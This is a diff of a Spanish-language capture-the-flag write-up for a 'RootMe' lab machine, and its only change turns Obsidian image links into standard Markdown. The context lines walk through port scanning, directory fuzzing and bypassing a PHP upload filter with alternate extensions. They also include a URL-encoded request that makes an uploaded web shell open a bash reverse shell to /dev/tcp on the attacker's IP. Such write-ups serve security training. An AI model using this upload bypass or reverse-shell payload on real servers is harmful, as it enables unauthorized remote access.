@@ -6,7 +6,7 @@ IP víctima: 10.130.183.87
 
 Comprobamos conectividad con la máquina
 
-![[rootme_ping.png]]
+![rootme_ping](rootme_ping.png)
 
 TTL  = 62 -> Máquina Linux
 
@@ -14,9 +14,9 @@ ___
 
 # Reconocimiento y enumeración
 
-![[rootme_nmap.png]]
+![rootme_nmap](rootme_nmap.png)
 
-![[rootme_servicesv.png]]
+![rootme_servicesv](rootme_servicesv.png)
 
 [+] Puertos abiertos
 	 -> 80 HTTP | Apache 2.4.41
@@ -24,18 +24,18 @@ ___
 
 Echamos un vistazo a la página web que corre en el puerto 80 de dicha máquina
 
-![[rootme_apache.png]]
+![rootme_apache](rootme_apache.png)
 
 Ya que no podemos ver nada más, hacemos fuzzing para enumerar directorios usando `ffuf`.
 
-![[rootme_fuzzing.png]]
+![rootme_fuzzing](rootme_fuzzing.png)
 
 Vemos que hay dos rutas: `uploads` y `panel`, entramos para investigar qué es cada una.
 
 `uploads`: Página que almacena archivos subidos
 `panel`: Página para subir archivos
 
-![[rootme_panel.png]]
+![rootme_panel](rootme_panel.png)
 
 
 # Explotación
@@ -48,7 +48,7 @@ Intentamos subir un archivo php con el siguiente contenido:
 ?>
 ```
 
-![[rootme_error.png]]
+![rootme_error](rootme_error.png)
 
 Nos dice que no permite archivos `php`, por lo que intentamos evadir esta restricción probando a cambiar la extensión del archivo:
 
@@ -57,7 +57,7 @@ Nos dice que no permite archivos `php`, por lo que intentamos evadir esta restri
 - php5
 - phtml
 
-![[rootme_accept.png]]
+![rootme_accept](rootme_accept.png)
 
 Ahora que se pudo, nos mandamos una reverse shell por el parametro `cmd` de nuestro archivo `payload_php.php5` (lo podemos ver en uploads también).
 
@@ -65,11 +65,11 @@ Ahora que se pudo, nos mandamos una reverse shell por el parametro `cmd` de nues
 http://10.130.183.87/uploads/payload_php.php5?cmd=bash%20-c%20%22bash%20-i%20%3E%26/dev/tcp/192.168.192.200/443%200%3E%261%22
 ```
 
-![[rootme_reverseshell.png]]
+![rootme_reverseshell](rootme_reverseshell.png)
 
 Aplicamos un tratamiento de tty y buscamos la flag del usuario.
 
-![[rootme_flaguser.png]]
+![rootme_flaguser](rootme_flaguser.png)
 
 # Escalada de privilegios
 
@@ -89,4 +89,4 @@ os.system("bash")
 
 Ejecutamos y vemos la flag de root
 
-![[rootme_flagroot.png]]
+![rootme_flagroot](rootme_flagroot.png)
